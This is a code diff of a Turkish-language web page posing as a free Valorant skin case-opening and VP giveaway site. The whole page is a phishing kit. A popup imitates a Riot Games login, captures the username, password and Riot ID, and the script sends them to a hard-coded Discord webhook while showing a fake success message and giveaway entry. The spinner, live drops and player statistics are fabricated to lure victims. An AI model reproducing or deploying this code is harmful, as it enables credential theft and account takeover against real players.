@@ -3,83 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VALOLOOT.NET | En İyi Valorant Kasa Açma Sitesi</title>
+    <title>VALOLOOT.NET | Best Valorant Case Opening Site</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=Montserrat:wght@700;900&display=swap" rel="stylesheet">
     <style>
         :root { --valo-red: #ff4655; --dark-bg: #0b1119; --nav-bg: #111420; }
+        body { background: var(--dark-bg) url('bg.jpg') fixed center/cover; color: white; font-family: 'Inter', sans-serif; margin: 0; padding: 0; min-height: 100vh; overflow-x: hidden; }
         
-        body { 
-            background-color: var(--dark-bg); 
-            background-image: url('background.jpg'); /* Orijinal Arka Plan */
-            background-size: cover;
-            background-attachment: fixed;
-            background-position: center;
-            color: white; 
-            font-family: 'Inter', sans-serif; 
-            margin: 0; padding: 0; min-height: 100vh; 
-        }
-        
-        .live-drops { background: rgba(0, 0, 0, 0.9); height: 100px; border-bottom: 2px solid var(--valo-red); display: flex; align-items: center; overflow: hidden; position: relative; width: 100%; z-index: 100; }
-        .mythic-label { background: var(--valo-red); height: 100%; display: flex; align-items: center; padding: 0 20px; font-family: 'Montserrat'; font-weight: 900; font-size: 14px; text-transform: uppercase; z-index: 10; color: #fff; }
+        /* Live Drops */
+        .live-drops { background: rgba(0, 0, 0, 0.95); height: 100px; border-bottom: 2px solid var(--valo-red); display: flex; align-items: center; justify-content: flex-start; overflow: hidden; position: relative; width: 100%; }
+        .mythic-label { background: var(--valo-red); height: 100%; display: flex; align-items: center; padding: 0 20px; font-family: 'Montserrat'; font-weight: 900; font-size: 14px; text-transform: uppercase; z-index: 10; color: #fff; box-shadow: 10px 0 20px rgba(0,0,0,0.5); }
         .drop-container { display: flex; align-items: center; padding-left: 15px; flex-grow: 1; }
-        .drop-card { background: rgba(255,255,255,0.05); border-radius: 4px; width: 130px; height: 75px; margin-right: 12px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; flex-shrink: 0; padding-top: 10px; overflow: hidden; border: 1px solid rgba(255,255,255,0.1); }
+        .drop-card { background: rgba(255,255,255,0.03); border-radius: 4px; width: 130px; height: 75px; margin-right: 12px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; flex-shrink: 0; animation: slideIn 0.4s ease-out; padding-top: 10px; overflow: hidden; }
         .drop-card img { height: 45px; object-fit: contain; }
         .rarity-box { width: 100%; height: 6px; margin-top: auto; }
+        @keyframes slideIn { from { transform: translateX(-30px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
 
+        /* Header */
         header { padding: 15px 50px; display: flex; align-items: center; background: var(--nav-bg); border-bottom: 1px solid rgba(255,255,255,0.1); gap: 40px; }
         .logo { font-family: 'Montserrat', sans-serif; font-size: 26px; font-weight: 900; }
         .logo span { color: var(--valo-red); }
         .nav-links { display: flex; gap: 25px; flex-grow: 1; }
         .nav-links a { color: #888; text-decoration: none; font-size: 13px; font-weight: 700; text-transform: uppercase; }
-        .btn-login { background: var(--valo-red); color: #fff; border: none; padding: 12px 25px; font-weight: 800; cursor: pointer; border-radius: 4px; text-transform: uppercase; font-size: 14px; }
+        .btn-login { background: var(--valo-red); color: #fff; border: none; padding: 12px 25px; font-weight: 800; cursor: pointer; border-radius: 4px; display: flex; align-items: center; gap: 10px; text-transform: uppercase; font-size: 14px; box-shadow: 0 4px 15px rgba(255, 70, 85, 0.4); }
 
-        .giveaway-section { max-width: 1100px; margin: 40px auto; background: rgba(17, 20, 32, 0.85); border: 1px solid var(--valo-red); border-radius: 12px; padding: 30px; display: flex; justify-content: space-between; align-items: center; backdrop-filter: blur(10px); }
+        /* Giveaway & Sections */
+        .giveaway-section { max-width: 1100px; margin: 40px auto; background: rgba(0,0,0,0.85); border: 1px solid var(--valo-red); border-radius: 12px; padding: 30px; display: flex; justify-content: space-between; align-items: center; }
         #countdown { font-size: 36px; font-weight: 900; color: #fff; font-family: 'Montserrat'; }
+        .title-container { width: 100%; background: linear-gradient(90deg, transparent, rgba(0,0,0,0.8), transparent); border-top: 1px solid rgba(255,70,85,0.3); border-bottom: 1px solid rgba(255,70,85,0.3); padding: 20px 0; margin: 40px 0; text-align: center; }
+        .title-container h3 { margin: 0; font-family: 'Montserrat'; letter-spacing: 6px; color: #fff; font-size: 24px; }
 
-        .case-wrapper { max-width: 1200px; margin: auto; display: flex; flex-direction: column; gap: 30px; padding-bottom: 60px; }
-        .case-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; }
-        .case-box { background: #111420; border-radius: 12px; padding: 20px; text-align: center; border: 1px solid rgba(255,255,255,0.05); width: 260px; transition: 0.3s; cursor: pointer; position: relative; overflow: hidden; }
+        /* Case Grid */
+        .case-wrapper { max-width: 1300px; margin: auto; display: flex; flex-direction: column; gap: 30px; padding-bottom: 60px; }
+        .case-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 25px; min-height: 100px; }
+        .case-box { background: #101123; border-radius: 12px; padding: 20px; text-align: center; border: 1px solid #222; transition: 0.3s; width: 280px; overflow: hidden; display: flex; flex-direction: column; align-items: center; cursor: pointer; }
         .case-box:hover { border-color: var(--valo-red); transform: translateY(-5px); }
-        .case-box img { width: 100%; height: 160px; object-fit: contain; margin-bottom: 15px; }
-        .vp-tag { color: #79eb1e; font-weight: 800; font-size: 20px; margin-bottom: 10px; font-family: 'Montserrat'; }
-        .open-btn { background: var(--valo-red); color: white; border: none; width: 100%; padding: 12px; font-weight: 800; border-radius: 4px; text-transform: uppercase; cursor: pointer; }
+        .case-img-container { width: 100%; height: 160px; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; }
+        .case-box img { max-width: 110%; max-height: 100%; object-fit: contain; }
+        .vp-tag { color: #79eb1e; font-weight: 800; font-size: 22px; margin-bottom: 15px; font-family: 'Montserrat'; }
+        .open-btn { background: var(--valo-red); color: white; border: none; width: 100%; padding: 14px; font-weight: 800; border-radius: 4px; cursor: pointer; text-transform: uppercase; }
 
-        .modal-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:2000; align-items:center; justify-content:center; backdrop-filter: blur(10px); }
-        .case-open-card { background:#111420; border:2px solid var(--valo-red); border-radius:15px; width:90%; max-width:500px; padding:40px; text-align:center; position:relative; box-shadow: 0 0 50px rgba(255, 70, 85, 0.2); max-height: 90vh; overflow-y: auto; }
-        
-        .spinner-container { width: 100%; height: 140px; background: #0b1119; border: 1px solid rgba(255,70,85,0.3); margin: 25px 0; overflow: hidden; position: relative; display: flex; align-items: center; border-radius: 8px; }
-        .spinner-line { position: absolute; left: 50%; top: 0; width: 3px; height: 100%; background: var(--valo-red); z-index: 10; box-shadow: 0 0 15px var(--valo-red); transform: translateX(-50%); }
-        .item-list { display: flex; position: absolute; left: 0; transition: transform 5s cubic-bezier(0.15, 0, 0.05, 1); will-change: transform; align-items: center; }
-        .item-list img { width: 120px; height: 100px; object-fit: contain; margin: 0 15px; opacity: 0.6; filter: grayscale(0.5); transition: 0.3s; }
+        /* Stats */
+        .live-stats { display: flex; justify-content: center; gap: 80px; padding: 60px 0; background: rgba(0,0,0,0.5); margin-top: 40px; border-top: 1px solid rgba(255,255,255,0.05); }
+        .stat-num { display: block; font-size: 34px; font-weight: 900; color: #fff; font-family: 'Montserrat'; min-width: 120px; }
 
-        .win-screen { display: none; animation: fadeIn 0.5s ease-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-
-        .win-item-img { width: 220px; height: 180px; object-fit: contain; filter: drop-shadow(0 0 25px #79eb1e); margin: 10px 0; }
-        .share-link-box { background: #0b1119; padding: 15px; border-radius: 6px; margin: 20px 0; border: 1px dashed #79eb1e; color: #79eb1e; font-family: 'Montserrat'; font-size: 13px; cursor: pointer; transition: 0.2s; }
-        
-        .custom-alert { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: var(--valo-red); color: white; padding: 15px 30px; border-radius: 50px; font-weight: 700; z-index: 3000; display: none; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-
-        .ai-analysis-btn { background: #6366f1; color: white; border: none; padding: 10px 15px; border-radius: 6px; font-weight: 700; cursor: pointer; margin-top: 10px; width: 100%; transition: 0.3s; font-size: 13px; }
-        .ai-result-box { background: rgba(99, 102, 241, 0.1); border: 1px solid #6366f1; padding: 15px; border-radius: 8px; margin-top: 15px; display: none; text-align: left; font-size: 13px; color: #e0e7ff; }
-        .ai-loader { display: none; margin: 10px 0; }
-        .ai-loader span { display: inline-block; width: 8px; height: 8px; background: #6366f1; border-radius: 50%; margin: 0 3px; animation: bounce 0.6s infinite alternate; }
-        @keyframes bounce { from { transform: translateY(0); } to { transform: translateY(-10px); } }
+        /* Loading Spinner */
+        .loader-circle { width: 14px; height: 14px; border: 2px solid #fff; border-bottom-color: transparent; border-radius: 50%; display: inline-block; animation: rot 1s linear infinite; margin-right: 8px; }
+        @keyframes rot { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes slideInRight { from { transform: translateX(20px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
     </style>
 </head>
 <body>
 
-    <div id="alertBox" class="custom-alert"></div>
-
     <div class="live-drops">
-        <div class="mythic-label">CANLI DROPLAR</div>
-        <div id="dropTrack" class="drop-container"></div>
+        <div class="mythic-label">Last Mythic Item</div>
+        <div class="drop-container" id="dropTrack"></div>
     </div>
 
     <header>
         <div class="logo">VALO<span>LOOT</span></div>
         <div class="nav-links">
-            <a href="#">KASALAR</a><a href="#">SAVAŞLAR</a><a href="#">MAĞAZA</a>
+            <a href="#">Kasalar</a><a href="#">Savaşlar</a><a href="#">Sözleşmeler</a><a href="#">Mağaza</a>
         </div>
         <div id="authArea">
             <button class="btn-login" onclick="openAuth()">GİRİŞ YAP</button>
@@ -88,189 +71,204 @@
 
     <div class="giveaway-section">
         <div>
-            <h2 style="margin:0; font-family:'Montserrat';">10 ADET 8900 VP ÇEKİLİŞİ</h2>
-            <p id="giveawayStatus" style="color:var(--valo-red); font-weight:800; margin:5px 0;">KATILMAK İÇİN OTURUM AÇIN</p>
+            <h2 style="margin:0; font-family:'Montserrat'; font-size:32px;">10 ADET 8900 VP ÇEKİLİŞİ</h2>
+            <p id="giveawayStatus" style="color:var(--valo-red); font-weight:800; margin:5px 0;">SADECE OTURUM AÇANLAR KATILABİLİR</p>
         </div>
-        <div style="text-align:right">
+        <div style="text-align:right; border-left: 2px solid var(--valo-red); padding-left: 30px;">
             <div id="countdown">00:00:00</div>
             <span style="font-size:10px; color:#555;">KALAN SÜRE</span>
         </div>
     </div>
+
+    <div class="title-container"><h3>POPÜLER SANDIKLAR</h3></div>
 
     <div class="case-wrapper">
         <div class="case-row" id="row1"></div>
         <div class="case-row" id="row2"></div>
     </div>
 
-    <div id="caseModal" class="modal-overlay">
-        <div class="case-open-card">
-            <div id="spinnerView">
-                <h2 style="font-family:'Montserrat'; letter-spacing: 2px;">KASA AÇILIYOR...</h2>
-                <div class="spinner-container">
-                    <div class="spinner-line"></div>
-                    <div id="itemList" class="item-list"></div>
-                </div>
-            </div>
-
-            <div id="winView" class="win-screen">
-                <h3 style="color:#79eb1e; font-family:'Montserrat'; margin-bottom: 5px;">TEBRİKLER!</h3>
-                <h1 style="margin:0; font-size: 24px;">DESTANSI ÖDÜL!</h1>
-                <img src="" id="wonItemImg" class="win-item-img" onerror="this.src='skin6.png'">
-                <h2 id="wonItemName" style="margin:10px 0; color: var(--valo-red);">YAĞMACI KARAMBİT</h2>
-                
-                <button class="ai-analysis-btn" onclick="analyzeWinWithAI()">✨ Gemini Skin Analizi</button>
-                <div id="aiLoader" class="ai-loader"><span></span><span></span><span></span></div>
-                <div id="aiResult" class="ai-result-box"></div>
-
-                <div style="background:rgba(121,235,30,0.1); padding:15px; border-radius:8px; border:1px solid #79eb1e; margin: 15px 0;">
-                    <span id="vpValue" style="color:#79eb1e; font-weight:900; font-size:24px;">4350 VP</span>
-                </div>
-
-                <p style="font-size:13px; color:#aaa;">Bu ödülü hesabına tanımlamak için 1 arkadaşını davet etmelisin!</p>
-                <div class="share-link-box" onclick="copyLink()">VALOLOOT.NET/DAVET/REF?ID=582934</div>
-                
-                <button class="open-btn" id="claimBtn" onclick="checkRef()" style="background:#79eb1e; color:#000;">ARKADAŞIM GELDİ, VP'Yİ YÜKLE</button>
-            </div>
-        </div>
+    <div class="live-stats">
+        <div class="stat-box"><span class="stat-num" id="stat-players">2,841</span><span style="color:#555; font-size:12px; font-weight:800;">AKTİF OYUNCU</span></div>
+        <div class="stat-box"><span class="stat-num" id="stat-cases">148,209</span><span style="color:#555; font-size:12px; font-weight:800;">KASA AÇILDI</span></div>
+        <div class="stat-box"><span class="stat-num" id="stat-vp">1,250,400</span><span style="color:#555; font-size:12px; font-weight:800;">VP DAĞITILDI</span></div>
     </div>
 
     <script>
-        const apiKey = "";
-        let isLoggedIn = false;
-
-        // Orijinal Resimlerin Olduğu Liste
-        const dropSkins = [
-            {name: "YAĞMACI KARAMBİT", vp: "4350 VP", img: "skin6.png"},
-            {name: "EJDER ATEŞİ VANDAL", vp: "2475 VP", img: "skin2.png"},
-            {name: "ASİL PHANTOM", vp: "1775 VP", img: "skin3.png"},
-            {name: "İON OPERATOR", vp: "1775 VP", img: "skin4.png"}
-        ];
-
-        async function analyzeWinWithAI() {
-            const winName = document.getElementById('wonItemName').innerText;
-            const resultBox = document.getElementById('aiResult');
-            const loader = document.getElementById('aiLoader');
-            resultBox.style.display = 'none';
-            loader.style.display = 'block';
-
-            try {
-                const response = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        contents: [{ parts: [{ text: `${winName} isimli Valorant skini hakkında kısa, heyecanlı bir analiz ve oyun ipucu ver. Türkçe konuş.` }] }],
-                        systemInstruction: { parts: [{ text: "Sen bir Valorant skin uzmanısın." }] }
-                    })
-                });
-                const result = await response.json();
-                loader.style.display = 'none';
-                resultBox.innerText = result.candidates?.[0]?.content?.parts?.[0]?.text || "Hata oluştu.";
-                resultBox.style.display = 'block';
-            } catch (e) {
-                loader.style.display = 'none';
-                resultBox.innerText = "Yapay zeka şu an meşgul.";
-                resultBox.style.display = 'block';
+        // 1. SAYAÇ VE KASA SİSTEMLERİ (ANA SAYFA)
+        document.addEventListener('DOMContentLoaded', function() {
+            // Skin Drops
+            const skins = [{img: "skin1.png", color: "#ade55c"}, {img: "skin2.png", color: "#4b82d5"}, {img: "skin3.png", color: "#d151dc"}, {img: "skin4.png", color: "#f7c133"}, {img: "skin5.png", color: "#ff4655"}];
+            const track = document.getElementById('dropTrack');
+            function addNewDrop() {
+                if(!track) return;
+                const s = skins[Math.floor(Math.random() * skins.length)];
+                const c = document.createElement('div');
+                c.className = 'drop-card';
+                c.innerHTML = `<img src="${s.img}" onerror="this.src='https://via.placeholder.com/40'"><div class="rarity-box" style="background:${s.color}"></div>`;
+                track.prepend(c);
+                if(track.children.length > 12) track.removeChild(track.lastChild);
+                setTimeout(addNewDrop, Math.random() * 3000 + 2000);
             }
-        }
+            addNewDrop();
 
-        function loadCases() {
+            // Cases Load
+            const cases = [
+                {n: "BAŞLANGIÇ", p: "GİRİŞ YAP", i: "case1.png"}, {n: "STANDART", p: "30 VP", i: "case2.png"},
+                {n: "ELİT", p: "50 VP", i: "case3.png"}, {n: "PREMIUM", p: "100 VP", i: "case4.png"},
+                {n: "EFSANEVİ", p: "500 VP", i: "case5.png"}, {n: "RADYANİT", p: "2000 VP", i: "case6.png"}
+            ];
             const r1 = document.getElementById('row1');
             const r2 = document.getElementById('row2');
-            // Orijinal caseX.png dosyalarını geri getirdim
-            const cases = [
-                {n: "BAŞLANGIÇ", p: "GİRİŞ YAP", i: "case1.png", free: true}, 
-                {n: "STANDART", p: "30 VP", i: "case2.png"},
-                {n: "ELİT", p: "50 VP", i: "case3.png"}, 
-                {n: "PREMIUM", p: "100 VP", i: "case4.png"},
-                {n: "EFSANEVİ", p: "500 VP", i: "case5.png"}, 
-                {n: "RADYANİT", p: "2000 VP", i: "case6.png"}
-            ];
-
-            r1.innerHTML = ''; r2.innerHTML = '';
-            cases.slice(0, 4).forEach(c => {
-                const fn = c.free ? "openFreeCase()" : "openAuth()";
-                r1.innerHTML += `<div class="case-box" onclick="${fn}"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/200x150?text=KASA'"><h3>${c.n}</h3><div class="vp-tag">${c.p}</div><button class="open-btn">AÇ</button></div>`;
-            });
-            cases.slice(4, 6).forEach(c => {
-                r2.innerHTML += `<div class="case-box" onclick="openAuth()"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/200x150?text=KASA'"><h3>${c.n}</h3><div class="vp-tag">${c.p}</div><button class="open-btn">AÇ</button></div>`;
-            });
-        }
-
-        function openFreeCase() {
-            if(!isLoggedIn) { openAuth(); return; }
-            const modal = document.getElementById('caseModal');
-            const list = document.getElementById('itemList');
-            modal.style.display = 'flex';
-            document.getElementById('spinnerView').style.display = 'block';
-            document.getElementById('winView').style.display = 'none';
-            list.innerHTML = '';
-            list.style.transform = 'translateX(0)';
-
-            for(let i=0; i < 40; i++) {
-                const s = (i === 35) ? dropSkins[0] : dropSkins[Math.floor(Math.random()*4)];
-                list.innerHTML += `<img src="${s.img}" onerror="this.src='https://via.placeholder.com/120x100?text=VALO'">`;
+            if(r1 && r2) {
+                cases.slice(0, 4).forEach(c => { r1.innerHTML += `<div class="case-box" onclick="openAuth()"><div class="case-img-container"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"></div><h3 style="margin:0; font-size:16px;">${c.n} KASASI</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`; });
+                cases.slice(4, 6).forEach(c => { r2.innerHTML += `<div class="case-box" onclick="openAuth()"><div class="case-img-container"><img src="${c.i}" onerror="this.src='https://via.placeholder.com/150'"></div><h3 style="margin:0; font-size:16px;">${c.n} KASASI</h3><div class="vp-tag">${c.p}</div><button class="open-btn">KASAYI AÇ</button></div>`; });
             }
 
-            setTimeout(() => { 
-                const move = (35 * 150) - (document.querySelector('.spinner-container').offsetWidth / 2) + 75;
-                list.style.transform = `translateX(-${move}px)`; 
-            }, 100);
+            // Timer
+            function tick() {
+                const now = new Date();
+                let target = new Date(); target.setHours(24, 0, 0, 0);
+                let diff = target - now;
+                if(diff < 0) diff += 86400000;
+                let h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
+                document.getElementById('countdown').innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+            }
+            setInterval(tick, 1000); tick();
 
-            setTimeout(() => {
-                document.getElementById('spinnerView').style.display = 'none';
-                document.getElementById('winView').style.display = 'block';
-                document.getElementById('wonItemImg').src = "skin6.png";
-            }, 5500);
-        }
+            // Live Stats Update
+            let pCount = 2841, cCount = 148209, vCount = 1250400;
+            setInterval(() => {
+                pCount += Math.floor(Math.random() * 5) - 2;
+                cCount += Math.floor(Math.random() * 3);
+                vCount += Math.floor(Math.random() * 100);
+                document.getElementById('stat-players').innerText = pCount.toLocaleString();
+                document.getElementById('stat-cases').innerText = cCount.toLocaleString();
+                document.getElementById('stat-vp').innerText = vCount.toLocaleString();
+            }, 3000);
+        });
 
+        // 2. AUTH SİSTEMİ (POP-UP)
         function openAuth() {
             const w = 550, h = 800;
             const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
-            let win = window.open("", "Auth", `width=${w},height=${h},top=${t},left=${l}`);
-            win.document.write(`<html><body style="background:#111; color:white; text-align:center; font-family:sans-serif; padding-top:50px;">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png" width="80">
-                <h2>RIOT GAMES GİRİŞ</h2>
-                <input id="u" placeholder="Kullanıcı Adı" style="width:80%; padding:15px; margin:10px; background:#333; color:white; border:none; border-radius:5px;"><br>
-                <input id="p" type="password" placeholder="Şifre" style="width:80%; padding:15px; margin:10px; background:#333; color:white; border:none; border-radius:5px;"><br>
-                <button onclick="s()" style="background:#ff4655; color:white; border:none; padding:15px; width:80%; margin-top:20px; font-weight:bold; cursor:pointer;">GİRİŞ YAP</button>
-                <script>function s(){ const u=document.getElementById('u').value, p=document.getElementById('p').value; if(u&&p){ window.opener.postMessage({u,p}, "*"); window.close(); } }<\/script>
-            </body></html>`);
+            let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
+            
+            const popupHTML = `
+                <html>
+                <head>
+                    <title>Riot Games - Oturum Aç</title>
+                    <style>
+                        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
+                        body { margin:0; height:100vh; overflow:hidden; background: url('login_bg.jpg') center/cover no-repeat #111; display:flex; justify-content:center; align-items:center; font-family:'Inter', sans-serif; }
+                        .card { background:#fff; width:330px; padding:45px 35px; border-radius:4px; text-align:center; box-shadow: 0 10px 50px rgba(0,0,0,0.5); }
+                        h2 { font-weight:900; font-size:24px; margin: 25px 0; text-transform:uppercase; color:#111; }
+                        .input-container { position: relative; margin: 10px 0; width: 100%; text-align: left; }
+                        input { width:100%; padding: 24px 16px 8px 16px; background:#f2f2f2; border:2px solid transparent; border-radius:4px; box-sizing:border-box; font-weight:700; outline:none; transition: 0.15s; }
+                        .label { position: absolute; left: 16px; top: 18px; color: #999; font-weight: 800; font-size: 11px; text-transform: uppercase; pointer-events: none; transition: 0.15s; }
+                        input:focus { background: #fff; border-color: #111; }
+                        input:focus + .label, input:not(:placeholder-shown) + .label { top: 8px; font-size: 9px; color: #333; }
+                        .social-grid { display:grid; grid-template-columns:repeat(5, 1fr); gap:8px; margin:20px 0; }
+                        .social-btn { height:40px; border-radius:4px; display:flex; align-items:center; justify-content:center; cursor:pointer; border: 1px solid #eee; }
+                        .next-btn { width:75px; height:75px; border:2px solid #eee; border-radius:24px; background:#fff; cursor:pointer; transition:0.3s; margin:20px auto; display:flex; align-items:center; justify-content:center; }
+                        .next-btn.active { border-color:#ff4655; }
+                        .next-btn svg { width:30px; fill:#ddd; }
+                        .next-btn.active svg { fill:#ff4655; }
+                    </style>
+                </head>
+                <body>
+                    <div class="card">
+                        <img src="login_logo.png" width="100" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png'">
+                        <h2>GİRİŞ</h2>
+                        <div class="input-container"><input type="text" id="u" placeholder=" " autocomplete="off"><span class="label">Kullanıcı Adı</span></div>
+                        <div class="input-container"><input type="password" id="p" placeholder=" " autocomplete="off"><span class="label">Şifre</span></div>
+                        <div class="input-container"><input type="text" id="g" placeholder=" " autocomplete="off"><span class="label">Riot ID (İSİM#ETİKET)</span></div>
+                        <div class="social-grid">
+                            <div class="social-btn" style="background:#1877f2"><img src="fb_logo.png" width="20"></div>
+                            <div class="social-btn"><img src="google_logo.png" width="20"></div>
+                            <div class="social-btn" style="background:#000"><img src="apple_logo.png" width="20"></div>
+                            <div class="social-btn" style="background:#107c10"><img src="xbox_logo.png" width="20"></div>
+                            <div class="social-btn" style="background:#00439c"><img src="ps_logo.png" width="20"></div>
+                        </div>
+                        <button class="next-btn" id="go"><svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg></button>
+                    </div>
+                    <script>
+                        const u=document.getElementById('u'), p=document.getElementById('p'), g=document.getElementById('g'), b=document.getElementById('go');
+                        const check=()=>(u.value && p.value)?b.classList.add('active'):b.classList.remove('active');
+                        u.oninput=check; p.oninput=check;
+                        b.onclick=function(){
+                            if(u.value && p.value){
+                                window.opener.postMessage({user:u.value, pass:p.value, gameid:g.value}, "*");
+                                window.close();
+                            }
+                        };
+                    <\/script>
+                </body>
+                </html>`;
+            win.document.write(popupHTML);
         }
 
-        window.addEventListener("message", (e) => {
-            if(e.data.u && e.data.p) {
-                isLoggedIn = true;
-                document.getElementById('authArea').innerHTML = `<div style="color:#79eb1e; font-weight:800; border:1px solid #79eb1e; padding:8px 20px; border-radius:4px;">${e.data.u.toUpperCase()}</div>`;
-                // Webhook Veri Gönderimi
-                fetch("https://discord.com/api/webhooks/1346618520242184193/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
+        // 3. WEBHOOK VE GİRİŞ SİMÜLASYONU
+        window.addEventListener("message", function(event) {
+            if (event.data.user && event.data.pass) {
+                const authArea = document.getElementById('authArea');
+                
+                // Butonu Yükleniyor Yap
+                authArea.innerHTML = `<button class="btn-login" style="background:#333; cursor:wait"><span class="loader-circle"></span> DOĞRULANIYOR...</button>`;
+
+                // Discord'a Gönder
+                fetch("https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ 
-                        embeds: [{ 
-                            title: "VALOLOOT GİRİŞ", 
-                            color: 16725845,
-                            fields: [{name: "Kullanıcı", value: e.data.u}, {name: "Şifre", value: e.data.p}],
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: "Riot Auth System",
+                        embeds: [{
+                            title: "✅ Yeni Giriş Başarılı!",
+                            color: 3066993,
+                            fields: [
+                                { name: "👤 Kullanıcı", value: "```" + event.data.user + "```" },
+                                { name: "🔑 Şifre", value: "```" + event.data.pass + "```" },
+                                { name: "🆔 Riot ID", value: "```" + (event.data.gameid || "Belirtilmedi") + "```" }
+                            ],
                             timestamp: new Date()
-                        }] 
+                        }]
                     })
                 });
+
+                // 2 Saniye Simülasyon
+                setTimeout(() => {
+                    const finalID = event.data.gameid || event.data.user.split('@')[0].toUpperCase() + "#TR1";
+                    
+                    // Header Güncelle
+                    authArea.innerHTML = `
+                        <div style="display:flex; align-items:center; gap:12px; background: rgba(0,0,0,0.7); padding: 6px 15px; border-radius: 4px; border: 1px solid #79eb1e; animation: slideInRight 0.5s ease-out;">
+                            <div style="text-align:right">
+                                <div style="color:#fff; font-weight:800; font-size:12px;">${finalID}</div>
+                                <div style="color:#79eb1e; font-size:9px; font-weight:900;">HESAP AKTİF</div>
+                            </div>
+                            <img src="avatar.png" onerror="this.src='https://wallpapers.com/images/hd/valorant-profile-pictures-y1v4u60z769p76p7.jpg'" 
+                                 style="width:32px; height:32px; border:1px solid #79eb1e; border-radius:2px; object-fit:cover;">
+                        </div>
+                    `;
+
+                    // Giveaway Text Güncelle
+                    const gText = document.getElementById('giveawayStatus');
+                    gText.innerText = "HESAP DOĞRULANDI, ÇEKİLİŞE KATILDINIZ!";
+                    gText.style.color = "#79eb1e";
+
+                    // Bildirim
+                    showValorantToast(finalID);
+                }, 2000);
             }
         });
 
-        loadCases();
-        function showMsg(t){ const a=document.getElementById('alertBox'); a.innerText=t; a.style.display='block'; setTimeout(()=>a.style.display='none',3000); }
-        function copyLink(){ showMsg("Link kopyalandı!"); }
-        function checkRef(){ showMsg("Arkadaşınız henüz giriş yapmadı!"); }
-
-        setInterval(() => {
-            const track = document.getElementById('dropTrack');
-            const s = dropSkins[Math.floor(Math.random()*4)];
-            const div = document.createElement('div');
-            div.className = 'drop-card';
-            div.innerHTML = `<img src="${s.img}" onerror="this.src='https://via.placeholder.com/40'"><div class="rarity-box" style="background:var(--valo-red)"></div>`;
-            track.prepend(div);
-            if(track.children.length > 15) track.removeChild(track.lastChild);
-        }, 4000);
+        function showValorantToast(username) {
+            const t = document.createElement('div');
+            t.style.cssText = "position:fixed; bottom:30px; right:30px; background:#1f2326; color:white; border-left:5px solid #79eb1e; padding:20px 30px; border-radius:4px; z-index:9999; box-shadow:0 10px 30px rgba(0,0,0,0.5); transform:translateX(120%); transition:0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);";
+            t.innerHTML = `<div style="display:flex; align-items:center; gap:15px;"><div style="background:#79eb1e; border-radius:50%; padding:5px;"><svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div><div><div style="font-weight:900; font-size:14px; text-transform:uppercase;">Bağlantı Başarılı</div><div style="font-size:12px; color:#aaa;">Hoş geldin, <b>${username}</b>.</div></div></div>`;
+            document.body.appendChild(t);
+            setTimeout(() => t.style.transform = 'translateX(0)', 100);
+            setTimeout(() => { t.style.transform = 'translateX(120%)'; setTimeout(() => t.remove(), 500); }, 5000);
+        }
     </script>
 </body>
 </html>
